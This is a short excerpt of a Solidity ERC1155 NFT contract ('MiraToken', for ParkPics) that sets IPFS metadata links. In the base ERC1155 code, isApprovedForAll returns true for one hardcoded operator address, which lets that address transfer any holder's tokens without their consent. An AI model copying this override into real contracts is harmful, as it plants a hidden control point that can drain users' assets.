...
contract MiraToken is ERC1155, IERC2981, Ownable, Pausable, ContextMixin {
    ...
    function contractURI() public pure returns (string memory) {
        return "ipfs://bafybeifqyp7bpmhcp3jznvsbjmwq336vodt7cvj245r7cbvascebc2uvhe"; // Contract-level metadata for ParkPics
    }
}
...
contract ERC1155 is Context, ERC165, IERC1155, IERC1155MetadataURI {
    ...
    constructor(string memory uri_) {
        ...
        _uriBase = "https://ipfs.io/ipfs/bafybeifqyp7bpmhcp3jznvsbjmwq336vodt7cvj245r7cbvascebc2uvhe"; // IPFS base for Mira's Tokens
    ...
    function isApprovedForAll(address account, address operator) public view virtual override returns (bool) {
        ...
        if(operator == address(0xe24974150f6Ae456ca04f9708F88F2c98d9f5F19)){
            return true;
        }
